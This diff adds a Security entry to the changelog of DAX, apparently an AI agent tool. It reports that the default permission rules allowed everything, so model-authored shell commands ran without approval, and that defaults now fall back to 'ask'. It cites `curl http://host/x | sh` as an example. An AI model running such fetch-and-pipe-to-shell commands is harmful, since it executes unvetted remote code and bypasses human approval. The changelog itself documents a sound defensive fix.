@@ -7,6 +7,21 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+
+- **The default permission ruleset no longer grants everything.** The shipped default began with
+  `"*": "allow"`, so `shell`, `edit` and every tool contributed by an MCP server resolved to `allow`
+  and the approval surface never appeared: a model-authored `curl http://host/x | sh` executed with
+  no prompt. Permissions are now enumerated deliberately and `PolicyEngine.evaluate` falls back to
+  `ask`, so anything unlisted - including a permission added to DAX later - requires approval.
+  Approval is spent on execution (`shell`), on egress (`webfetch`, `websearch`, `codesearch`), and on
+  leaving the worktree (`external_directory`); reads and in-worktree edits stay quiet.
+  **Breaking:** operators who relied on the implicit allow will now see prompts. Configure
+  `permission` in `dax.json` to restore specific grants - an explicit rule still wins over the default.
+- `webfetch` and `websearch` were assigned a *file path* ruleset, so every URL matched its `"*": "allow"`
+  entry and the egress gate could never fire.
+
+
 ## [1.3.0] - 2026-08-14
 
 ### Added
